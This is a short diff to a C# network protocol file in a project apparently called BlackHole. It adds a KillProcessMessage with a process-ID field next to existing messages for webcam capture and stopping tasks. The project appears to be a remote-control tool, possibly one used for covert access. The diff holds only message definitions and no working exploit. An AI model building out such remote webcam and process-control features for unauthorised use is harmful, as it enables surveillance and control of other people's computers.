@@ -196,6 +196,12 @@ namespace BlackHole.Common.Network.Protocol
         public int FrameRate { get; set; }
     }
 
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class KillProcessMessage : NetMessage
+    {
+        public string PID { get; set; }
+    }
+
 
     // ====================================
     // ================= Data =============
@@ -234,6 +240,7 @@ namespace BlackHole.Common.Network.Protocol
         public string Size { get; set; }
     }
 
+    [ProtoInclude(1024, typeof(KillProcessMessage))]
     [ProtoInclude(1023, typeof(StopTasksMessage))]
     [ProtoInclude(1022, typeof(WebcamCaptureMessage))]
     [ProtoInclude(1021, typeof(StopWebcamCaptureMessage))]
